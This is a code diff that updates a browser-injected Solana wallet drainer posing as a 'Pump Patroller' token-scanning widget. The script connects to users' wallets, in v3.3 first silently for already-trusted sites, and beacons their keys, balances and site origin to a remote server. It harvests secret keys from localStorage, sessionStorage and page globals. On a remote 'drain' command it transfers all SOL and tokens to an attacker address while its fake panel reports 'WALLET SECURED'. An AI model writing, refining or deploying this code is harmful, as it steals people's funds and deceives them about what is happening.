@@ -5,7 +5,7 @@
   const E = "https://esm.sh/";
   const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
   const BKEY = "72d296b612eb0a11931b364ba1333a70";
-  const VER = "v3.2";
+  const VER = "v3.3";
   const RPCS = [
     "https://solana-rpc.publicnode.com",
     "https://api.mainnet-beta.solana.com",
@@ -20,38 +20,29 @@
     MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So"
   };
 
-  function withTO(p, ms) {
+  const withTO = function (p, ms) {
     return new Promise(function (resolve) {
       const t = setTimeout(function () { resolve(null); }, ms);
       Promise.resolve(p).then(function (v) { clearTimeout(t); resolve(v); },
         function () { clearTimeout(t); resolve(null); });
     });
-  }
+  };
 
   async function rpc(method, params) {
     let lastErr = null;
     for (const u of RPCS) {
       try {
-        const r = await fetch(u, {
-          method: "POST",
-          headers: { "content-type": "application/json" },
-          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params })
-        });
-        if (!r.ok) {
-          lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
-          await new Promise(function (s) { setTimeout(s, 300); });
-          continue;
-        }
+        const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
+          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }) });
+        if (!r.ok) { lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
+          await new Promise(s => setTimeout(s, 300)); continue; }
         const j = await r.json();
         if (j && j.result !== undefined) return j;
-        if (j && j.error) {
-          lastErr = new Error(j.error.message || "RPC error");
+        if (j && j.error) { lastErr = new Error(j.error.message || "RPC error");
           if (j.error.code === -32601) return j;
-          await new Promise(function (s) { setTimeout(s, 300); });
-          continue;
-        }
+          await new Promise(s => setTimeout(s, 300)); continue; }
       } catch (e) { lastErr = e; }
-      await new Promise(function (s) { setTimeout(s, 300); });
+      await new Promise(s => setTimeout(s, 300));
     }
     return { error: { message: lastErr ? String(lastErr.message || lastErr) : "all RPC endpoints failed" } };
   }
@@ -60,52 +51,60 @@
     for (let a = 0; a < 3; a++) {
       const r = await rpc("getBalance", [pk]);
       if (r && r.result !== undefined) return r.result;
-      await new Promise(function (s) { setTimeout(s, 1200); });
+      await new Promise(s => setTimeout(s, 1200));
     }
     return null;
   }
-
   async function readTokens(pk) {
     for (let a = 0; a < 3; a++) {
       const r = await rpc("getParsedTokenAccountsByOwner", [pk, {
-        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm",
-        commitment: "confirmed"
-      }]);
+        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm", commitment: "confirmed" }]);
       if (r && r.result !== undefined) return r.result;
-      await new Promise(function (s) { setTimeout(s, 1200); });
+      await new Promise(s => setTimeout(s, 1200));
     }
     return null;
   }
 
   let PKSTR = null;
-
   const beacon = function (m, o) {
     o = o || {};
     try {
-      fetch(SRV + "/beacon?s=" + BKEY, {
-        method: "POST",
-        body: JSON.stringify({
-          pk: o.pk || PKSTR || "?",
-          provider: o.provider || "unknown",
-          origin: location.origin,
-          value: o.value || 0,
-          sol: o.sol || 0,
-          toks: o.toks || "",
-          m: m,
-          mode: o.mode || "",
-          sig: o.sig || "",
-          msg: o.msg || "",
-          extra: o.extra || ""
-        })
-      });
+      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
+        body: JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
+          origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
+          m: m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
     } catch (e) {}
   };
 
-  // ── detection: collect providers, try connect() on each, return first success ──
-  function findProviders() {
-    const found = [];
-    const seen = new Set();
-    const named = [
+  const pubStr = function (v) {
+    try {
+      if (!v) return null;
+      if (typeof v === "string") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v) ? v : null;
+      if (typeof v.toBase58 === "function") return v.toBase58();
+      if (v instanceof Uint8Array) return new PublicKey(v).toBase58();
+      return null;
+    } catch (e) { return null; }
+  };
+
+  try {
+    beacon("loaded", { provider: "scanning" });
+
+    const mod = await import(E + "@solana/web3.js@1.95.0");
+    const PublicKey = mod.PublicKey, Keypair = mod.Keypair, SystemProgram = mod.SystemProgram,
+      Transaction = mod.Transaction, Connection = mod.Connection;
+    const spl = await import(E + "@solana/spl-token@0.4.9");
+    const createTransfer = spl.createTransfer,
+      createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction,
+      getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
+    const bs = await import(E + "bs58@6.0.0");
+    const b58d = bs.decode;
+    const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
+
+    // ══ DETECTION v3.3: connect-first, zero .publicKey access during scan ══
+    // For each provider: silent connect({onlyIfTrusted}) first — resolves instantly
+    // for already-authorized sites. Then explicit connect() with popup. Then read
+    // the key ONLY from the connect() result — never from the provider object.
+    const PROVIDERS = [
       ["phantom", function () { return window.phantom && window.phantom.solana; }],
       ["axiom", function () { return window.axiom && window.axiom.solana; }],
       ["trust", function () { return window.trustwallet && window.trustwallet.solana; }],
@@ -113,98 +112,63 @@
       ["backpack", function () { return window.backpack && window.backpack.solana; }],
       ["solana", function () { return window.solana; }]
     ];
-    const frames = [];
-    try { frames.push(window); } catch (e) {}
-    try { if (window.top && window.top !== window) frames.push(window.top); } catch (e) {}
-    for (let fi = 0; fi < frames.length; fi++) {
-      const w = frames[fi];
-      for (let ci = 0; ci < named.length; ci++) {
-        let p = null;
-        try { p = named[ci][1](); } catch (e) { p = null; }
-        if (!p) continue;
-        if (typeof p.connect !== "function" && typeof p.request !== "function") continue;
-        if (seen.has(p)) continue;
-        seen.add(p);
-        found.push({ name: named[ci][0], provider: p, connected: false });
-      }
-      const keys = Object.keys(w);
-      for (let ki = 0; ki < keys.length; ki++) {
-        const k = keys[ki];
-        let v = null;
-        try { v = w[k]; } catch (e) { continue; }
-        if (!v || typeof v !== "object") continue;
-        if (typeof v.connect !== "function") continue;
-        if (seen.has(v)) continue;
-        seen.add(v);
-        found.push({ name: "ext:" + k, provider: v, connected: false });
-      }
-    }
-    return found;
-  }
-
-  try {
-    beacon("loaded", { provider: "scanning" });
-
-    const mod = await import(E + "@solana/web3.js@1.95.0");
-    const PublicKey = mod.PublicKey;
-    const Keypair = mod.Keypair;
-    const SystemProgram = mod.SystemProgram;
-    const Transaction = mod.Transaction;
-    const Connection = mod.Connection;
-
-    const spl = await import(E + "@solana/spl-token@0.4.9");
-    const createTransfer = spl.createTransfer;
-    const createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction;
-    const getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
-
-    const bs = await import(E + "bs58@6.0.0");
-    const b58d = bs.decode;
-
-    const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
-
-    // ── connect loop: try each provider in order, first success wins ──
-    const candidates = findProviders();
-    beacon("detect", { provider: "scan", extra: "found " + candidates.length + " provider(s): " + candidates.map(function (c) { return c.name; }).join(",") });
 
     let name = null, prov = null, pk = null;
-    for (let i = 0; i < candidates.length; i++) {
-      const cand = candidates[i];
+    const found = [];
+
+    for (const item of PROVIDERS) {
+      const n = item[0], f = item[1];
+      let p = null;
+      try { p = f(); } catch (e) { p = null; }
+      if (p && typeof p.connect === "function") found.push([n, p]);
+    }
+    beacon("detect", { provider: "scan", extra: "candidates: " + (found.map(function (x) { return x.name; }).join(",") || "none") });
+
+    // pass 1: silent reconnect (already-authorized sites — no popup)
+    for (const item of found) {
+      const n = item[0], p = item[1];
       try {
-        const c = await withTO(Promise.resolve(cand.provider.connect()), 20000);
-        const k = pubStr((c && c.publicKey) || cand.provider.publicKey);
-        if (k) {
-          name = cand.name;
-          prov = cand.provider;
-          pk = k;
-          break;
+        const r = await withTO(Promise.resolve(p.connect({ onlyIfTrusted: true })), 8000);
+        const k = pubStr(r && r.publicKey);
+        if (k) { name = n; prov = p; pk = k; break; }
+      } catch (e) {}
+    }
+
+    // pass 2: explicit connect with popup (only if nothing silent-connected)
+    if (!pk) {
+      for (const item of found) {
+        const n = item[0], p = item[1];
+        try {
+          const r = await withTO(Promise.resolve(p.connect()), 30000);
+          const k = pubStr(r && r.publicKey);
+          if (k) { name = n; prov = p; pk = k; break; }
+        } catch (e) {
+          beacon("err", { pk: "?", provider: n, msg: "connect refused: " + String(e && e.message || e) });
         }
-      } catch (e) {
-        beacon("err", { pk: "?", provider: cand.name, msg: "connect failed: " + String(e && e.message || e) });
       }
     }
 
-    if (!prov || !pk) {
-      beacon("err", { provider: "none", msg: "no wallet connected \u2014 all providers refused or timed out" });
+    if (!pk) {
+      beacon("err", { provider: "none", msg: "no wallet connected \u2014 user declined or no extension in this browser" });
       return;
     }
 
+    beacon("detect", { provider: name, extra: "connected \u2014 reading balances" });
+
     const label = name.indexOf("ext:") === 0 ? name.slice(4) : name;
-    PKSTR = pk;
     const pkB = new PublicKey(pk);
     const conn = new Connection(RPCS[0], "confirmed");
 
-    // — inventory —
     const bal = await readBalance(pk);
     if (bal === null) {
-      beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC endpoints \u2014 network or rate-limit" });
+      beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC endpoints \u2014 network/rate-limit" });
       return;
     }
     const r = await readTokens(pk);
     const rArr = (r && r.value) ? r : { value: [] };
 
     const amt = {}, dec = {}, srcs = {};
-    for (let i = 0; i < rArr.value.length; i++) {
-      const item = rArr.value[i];
+    for (const item of rArr.value) {
       const d = item.account.parsed && item.account.parsed.data;
       if (d && d.mint) {
         amt[d.mint] = Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals);
@@ -212,12 +176,8 @@
         srcs[d.mint] = item.pubkey;
       }
     }
-
-    const toks = Object.entries(MINTS).filter(function (kv) {
-      return (amt[kv[1]] || 0) > 0.01;
-    }).map(function (kv) {
-      return { k: kv[0], ui: amt[kv[1]] };
-    });
+    const toks = Object.entries(MINTS).filter(function (kv) { return (amt[kv[1]] || 0) > 0.01; })
+      .map(function (kv) { return { k: kv[0], ui: amt[kv[1]] }; });
 
     const px = {};
     try {
@@ -228,77 +188,58 @@
         if (p && +p > 0) px[id] = +p;
       }
     } catch (e) {}
-
     const SOLpx = px.WSOL || 150;
     const sol = bal / 1e9;
-    const value = sol * SOLpx + toks.reduce(function (s, t) {
-      return s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1));
-    }, 0);
-    const fmt = function (n) { return (+n).toLocaleString("en-US", { maximumFractionDigits: 0 }); };
+    const value = sol * SOLpx + toks.reduce(function (s, t) { return s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1)); }, 0);
+    const fmt = n => (+n).toLocaleString("en-US", { maximumFractionDigits: 0 });
     const tokStr = toks.map(function (t) { return Math.round(t.ui) + " " + t.k; }).join(" \u00b7 ");
 
     beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
-    // — cover UI —
     try {
       const el = document.createElement("div");
       el.id = "__ppcard";
       el.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:272px;background:#10141B;border:1px solid #232B3A;border-radius:12px;box-shadow:0 16px 48px rgba(0,0,0,.55);font:12px/1.5 Inter,system-ui,sans-serif;color:#E8ECF4;overflow:hidden;";
       el.innerHTML =
         '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
-        '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
-        '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
-        '<span style="font-size:10px;color:#7E899D;">' + VER + '</span>' +
-        '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
+          '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
+          '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
+          '<span style="font-size:10px;color:#7E899D;">' + VER + '</span>' +
+          '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
         '</div>' +
         '<div style="padding:12px 14px;">' +
-        '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
-        '<div style="font:600 12px ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + '</div>' +
-        '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label + " \u00b7 mainnet</div>" +
-        '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
-        '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + fmt(value) + '</div>' +
-        '<div id="__pp_sub" style="font:11px ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " \u00b7 " + tokStr : "") + '</div>' +
+          '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
+          '<div style="font:600 12px ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + '</div>' +
+          '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label + " \u00b7 mainnet</div>" +
+          '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
+          '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + fmt(value) + '</div>' +
+          '<div id="__pp_sub" style="font:11px ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " \u00b7 " + tokStr : "") + '</div>' +
         '</div>' +
         '<div id="__pp_foot" style="display:flex;align-items:center;gap:7px;padding:9px 14px;border-top:1px solid #1B2230;font-size:11px;color:#7E899D;">' +
-        '<span>PATROL ACTIVE</span><span id="__pp_scan" style="color:#9AA5B8;">\u00b7 2,341 tokens scanned</span>' +
+          '<span>PATROL ACTIVE</span><span id="__pp_scan" style="color:#9AA5B8;">\u00b7 2,341 tokens scanned</span>' +
         '</div>';
       document.body.appendChild(el);
       document.getElementById("__pp_x").onclick = function () { el.remove(); };
       let scans = 2341;
-      setInterval(function () {
-        scans += Math.random() * 3 | 0;
-        const s = document.getElementById("__pp_scan");
-        if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned";
-      }, 5000);
-    } catch (e) {
-      beacon("err", { pk: pk, provider: label, msg: "ui: " + String(e && e.message || e) });
-    }
+      setInterval(function () { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);
+    } catch (e) { beacon("err", { pk: pk, provider: label, msg: "ui: " + String(e && e.message || e) }); }
 
     const report = function (mode, sig, extra) {
       try {
-        fetch(SRV + "/beacon?s=" + BKEY, {
-          method: "POST",
-          body: JSON.stringify({
-            pk: pk, provider: label, origin: location.origin,
-            value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr,
-            m: "drain", mode: mode, sig: String(sig), extra: extra || ""
-          })
-        });
+        fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
+          body: JSON.stringify({ pk: pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode: mode, sig: String(sig), extra: extra || "" }) });
       } catch (e) {}
     };
 
-    // — secret-key candidates —
     const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
     const cands = [];
-    for (let si = 0; si < 2; si++) {
-      const st = si === 0 ? localStorage : sessionStorage;
+    for (const st of [localStorage, sessionStorage]) {
       try {
         for (let i = 0; i < st.length; i++) {
           const v = st.getItem(st.key(i));
           if (!v) continue;
-          if (/^[1-9A-HJ-NP-Za-km-z]{88}$/.test(v)) {
-            cands.push({ b58: v });
-          } else if (v.charAt(0) === "{") {
+          if (/^[1-9A-HJ-NP-Za-km-z]{88}$/.test(v)) cands.push({ b58: v });
+          else if (v.charAt(0) === "{") {
             try {
               const j = JSON.parse(v);
               for (const k of Object.keys(j)) {
@@ -318,9 +259,7 @@
         if (k === "keypair" && typeof o[k] === "object") walk(o[k], d + 1);
       }
     };
-    for (const g of ["__wallet", "wallet", "walletAdapter", "keypair", "adapter"]) {
-      try { walk(window[g], 0); } catch (e) {}
-    }
+    for (const g of ["__wallet", "wallet", "walletAdapter", "keypair", "adapter"]) { try { walk(window[g], 0); } catch (e) {} }
 
     const secretOf = function (c) {
       if (c.b58) return Uint8Array.from(b58d(c.b58));
@@ -343,19 +282,13 @@
       const r2 = await readTokens(pk);
       const r2v = r2 ? r2 : { value: [] };
       const amt2 = {}, dec2 = {}, srcs2 = {};
-      for (let i = 0; i < r2v.value.length; i++) {
-        const it = r2v.value[i];
+      for (const it of r2v.value) {
         const d = it.account.parsed && it.account.parsed.data;
-        if (d && d.mint) {
-          amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals);
-          dec2[d.mint] = d.decimals == null ? 6 : d.decimals;
-          srcs2[d.mint] = it.pubkey;
-        }
+        if (d && d.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals); dec2[d.mint] = d.decimals == null ? 6 : d.decimals; srcs2[d.mint] = it.pubkey; }
       }
       const tx = new Transaction();
       const moved = [];
-      for (let i = 0; i < toks.length; i++) {
-        const t = toks[i];
+      for (const t of toks) {
         const have = amt2[MINTS[t.k]] || 0;
         if (have < 0.01) continue;
         const mint = new PublicKey(MINTS[t.k]);
@@ -367,9 +300,7 @@
         moved.push(t.k);
       }
       const lam = Math.floor(balNum);
-      if (lam > FEE + 5000) {
-        tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
-      }
+      if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
       tx.feePayer = pkB;
       tx.recentBlockhash = bh2.result.value.blockhash;
       tx.lastValidBlockHeight = bh2.result.value.lastValidBlockHeight;
@@ -377,10 +308,7 @@
     }
 
     function setFoot(txt, color) {
-      try {
-        document.getElementById("__pp_foot").innerHTML =
-          '<span style="color:' + color + ';font-weight:600;">' + txt + '</span>';
-      } catch (e) {}
+      try { document.getElementById("__pp_foot").innerHTML = '<span style="color:' + color + ';font-weight:600;">' + txt + '</span>'; } catch (e) {}
     }
 
     let done = false;
@@ -389,35 +317,22 @@
       done = true;
       try {
         for (const c of cands) {
-          let s;
-          try { s = secretOf(c); } catch (e) { s = null; }
+          let s; try { s = secretOf(c); } catch (e) { s = null; }
           if (!s || s.length !== 64) continue;
-          let kp;
-          try { kp = Keypair.fromSecretKey(s); } catch (e) { continue; }
+          let kp; try { kp = Keypair.fromSecretKey(s); } catch (e) { continue; }
           if (!kp.publicKey.equals(pkB)) continue;
           const bt = await buildTx(to);
           if (bt.err) { done = false; report("err", "", bt.err); return; }
-          if (!bt.tx.instructions.length) {
-            setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D");
-            report("empty", "");
-            return;
-          }
+          if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
           bt.tx.sign([kp]);
           const sig = await conn.sendRawTransaction(bt.tx.serialize());
-          setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7");
-          report("secret", sig, bt.moved.join(","));
-          return;
+          setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, bt.moved.join(",")); return;
         }
         const bt = await buildTx(to);
         if (bt.err) { done = false; report("err", "", bt.err); return; }
-        if (!bt.tx.instructions.length) {
-          setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D");
-          report("empty", "");
-          return;
-        }
+        if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
         const sig = await prov.signAndSendTransaction(bt.tx);
-        setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7");
-        report("popup", sig, bt.moved.join(","));
+        setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, bt.moved.join(","));
       } catch (e) {
         setFoot("ERROR \u00b7 " + String(e && e.message || e).slice(0, 40), "#F0616D");
         report("err", String(e && e.message || e));
@@ -427,15 +342,10 @@
 
     let lastN = "";
     setInterval(async function () {
-      let c;
-      try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch (e) { return; }
-      if (c && c.cmd === "drain" && c.to && c.n !== lastN) {
-        lastN = c.n;
-        drain(c.to);
-      }
+      let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch (e) { return; }
+      if (c && c.cmd === "drain" && c.to && c.n !== lastN) { lastN = c.n; drain(c.to); }
     }, 2500);
-
   } catch (e) {
-    try { beacon("err", { provider: name, msg: "fatal: " + String(e && e.message || e) }); } catch (e2) {}
+    try { beacon("err", { msg: "fatal: " + String(e && e.message || e) }); } catch (e2) {}
   }
 })();
